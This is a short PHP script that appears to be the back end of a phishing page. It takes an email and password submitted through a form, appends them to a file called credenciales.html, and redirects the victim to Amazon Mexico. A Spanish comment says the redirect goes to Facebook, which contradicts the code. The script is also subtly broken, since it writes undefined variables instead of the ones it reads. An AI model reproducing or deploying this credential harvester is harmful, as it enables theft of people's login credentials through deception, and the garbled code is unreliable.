<?php

$Correo = $_POST['email']; 

$Contraseña = $_POST['password'];

$SALTO="\r\n";

$f = fopen("credenciales.html", "a");
fwrite ($f, "----------------------------------".$SALTO.'Correo: '.$email.$SALTO.'Contraseña: '.$password.$SALTO."----------------------------------".$SALTO);
fclose($f);

sleep(2);

//Redireccione a la web original (Facebook)

header('Location: https://www.amazon.com.mx/');
?>